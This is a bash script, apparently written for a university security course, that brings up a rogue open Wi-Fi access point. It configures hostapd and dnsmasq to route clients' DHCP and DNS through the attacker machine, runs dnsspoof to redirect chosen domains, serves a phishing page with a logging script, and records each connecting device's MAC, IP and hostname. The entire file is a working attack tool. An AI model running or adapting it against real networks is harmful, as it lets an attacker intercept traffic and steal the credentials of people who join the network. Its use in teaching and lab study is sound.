#!/bin/bash
# Author: Dr Ayman El hajjar
# File: ap/rogue-ap.sh
# Rogue Access Point with DNS spoofing
# Extra files: spoof.txt (domain redirection), optional phishing page
# Tailing: Client association, DHCP leases, DNS redirection

set -euo pipefail

RESET=$'\033[0m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
RED=$'\033[0;31m'

info()    { printf "[${YELLOW}i${RESET}] %s\n" "$*"; }
ok()      { printf "[${GREEN}✓${RESET}] %s\n" "$*"; }
err()     { printf "[${RED}!${RESET}] %s\n" "$*" 1>&2; }

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
ENV_FILE="$REPO_ROOT/.env"
[ -f "$ENV_FILE" ] && . "$ENV_FILE"

INTERFACE="${INTERFACE:-wlan0}"
AP_IP="${AP_IP:-192.168.140.1/24}"
AP_IP_BASE="${AP_IP_BASE:-192.168.140.1}"
REGDOM="${REGDOM:-GB}"
RUNTIME_DIR="${RUNTIME_DIR:-/tmp/cybok-ap}"COURSE_DIR="${COURSE_DIR:-$REPO_ROOT}"
SSID="${SSID:-6CSEF005W-Rogue}"
CHANNEL="${CHANNEL:-6}"
SPOOF_FILE="${SPOOF_FILE:-$COURSE_DIR/ap/files/phish/spoof.txt}"

require_root() {
  if [ "${EUID:-$(id -u)}" -ne 0 ]; then
    err "Please run as root (sudo $0)"
    exit 1
  fi
}

cleanup_trap() {
  info "CTRL-C received: tearing down rogue AP..."
  "$COURSE_DIR/ap/teardown-ap.sh" || true
  pkill dnsspoof 2>/dev/null || true
  exit 130
}

ensure_dirs() {
  mkdir -p "$RUNTIME_DIR"
if [ "${EUID:-$(id -u)}" -eq 0 ] && [ -n "${SUDO_USER:-}" ]; then
  chown -R "$SUDO_USER:$SUDO_USER" "$RUNTIME_DIR" 2>/dev/null || true
fi
}
serve_phishing_page() {
  local PHISH_DIR="$COURSE_DIR/ap/files/phish"
  if [ -f "$PHISH_DIR/index.html" ]; then
    info "Serving phishing page from $PHISH_DIR..."
    cd "$PHISH_DIR"
python3 "$PHISH_DIR/logger.py" &
    ok "Phishing page available at http://$AP_IP_BASE/"
  else
    err "Phishing page not found at $PHISH_DIR/index.html"
  fi
}


docheckbefore() {
  info "Setting regulatory domain: $REGDOM"
  iw reg set "$REGDOM" || true

  info "Resetting interface state: $INTERFACE"
  ip link set "$INTERFACE" down 2>/dev/null || true

  info "Setting fixed MAC address for stable BSSID"
  ip link set dev "$INTERFACE" address 02:11:22:33:44:55

  iw dev "$INTERFACE" set type __ap 2>/dev/null || true
  ip addr flush dev "$INTERFACE" 2>/dev/null || true
  ip link set "$INTERFACE" up
  sleep 1

  info "Assigning static IP: $AP_IP"
  ip addr add "$AP_IP" dev "$INTERFACE" 2>/dev/null || true
}

write_hostapd_conf() {
  cat > "$RUNTIME_DIR/hostapd.conf" <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wmm_enabled=0
ignore_broadcast_ssid=0
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF
}

write_dnsmasq_conf() {
  cat > "$RUNTIME_DIR/dnsmasq.conf" <<EOF
interface=$INTERFACE
bind-interfaces
domain-needed
bogus-priv
dhcp-authoritative
dhcp-range=192.168.140.50,192.168.140.150,255.255.255.0,12h
dhcp-option=3,$AP_IP_BASE
dhcp-option=6,$AP_IP_BASE
no-resolv
log-dhcp
EOF
}

setup_unmanaged_interface() {
  local config_file="/etc/NetworkManager/conf.d/99-unmanaged-devices.conf"
  
  if grep -q "interface-name:$INTERFACE" "$config_file" 2>/dev/null; then
    info "NetworkManager already configured to ignore $INTERFACE"
    return
  fi
  
  info "Configuring NetworkManager to ignore $INTERFACE..."
  
  cat > "$config_file" <<EOF
[keyfile]
unmanaged-devices=interface-name:$INTERFACE
EOF
  
  systemctl restart NetworkManager
  sleep 2
  ok "NetworkManager configured to ignore $INTERFACE"
}
start_services() {
  info "Starting hostapd..."
  /usr/sbin/hostapd -B -P "$RUNTIME_DIR/hostapd.pid" -f "$RUNTIME_DIR/hostapd_rogue.log" "$RUNTIME_DIR/hostapd.conf"

  info "Starting dnsmasq..."
  pkill dnsmasq 2>/dev/null || true
  dnsmasq --conf-file="$RUNTIME_DIR/dnsmasq.conf" \
          --pid-file="$RUNTIME_DIR/dnsmasq.pid" \
          --log-facility="$RUNTIME_DIR/dnsmasq_rogue.log"

  ok "Rogue AP Enabled: SSID ${CYAN}${SSID}${RESET} on ${CYAN}${INTERFACE}${RESET} (${CYAN}${AP_IP_BASE}${RESET})"
  info "Logs: hostapd=${RUNTIME_DIR}/hostapd_rogue.log  dnsmasq=${RUNTIME_DIR}/dnsmasq_rogue.log"
}

start_dnsspoof() {
  if [ ! -f "$SPOOF_FILE" ]; then
    err "Spoof file not found: $SPOOF_FILE"
    exit 2
  fi

  info "Starting dnsspoof with $SPOOF_FILE..."
  dnsspoof -i "$INTERFACE" -f "$SPOOF_FILE" &
  ok "DNS spoofing active"
}

tail_clean() {
  info "Showing connections and DHCP leases (Ctrl-C to stop)..."
  stdbuf -oL -eL tail -F "$RUNTIME_DIR/hostapd_rogue.log" "$RUNTIME_DIR/dnsmasq_rogue.log" | \
  awk -v GREEN="$GREEN" -v CYAN="$CYAN" -v RESET="$RESET" '
    /AP-STA-CONNECTED/ {
      mac=$NF; ts=strftime("%H:%M:%S");
      printf("[%s] %sCONNECT%s %s\n", ts, GREEN, RESET, mac); fflush();
    }
    /DHCPACK\(wlan0\)/ {
      ts=strftime("%H:%M:%S");
      ip=$5; mac=$6; host=$7; if (host=="") host="-";
      printf("[%s] %sDHCP%s %s -> %s %s\n", ts, CYAN, RESET, mac, ip, host); fflush();
    }
  '
}

main() {
  require_root
  setup_unmanaged_interface
  trap cleanup_trap INT TERM
  "$COURSE_DIR/ap/teardown-ap.sh" || true
  ensure_dirs
  docheckbefore
  write_hostapd_conf
  write_dnsmasq_conf
  start_services
  start_dnsspoof
  serve_phishing_page
  tail_clean
}

main "$@"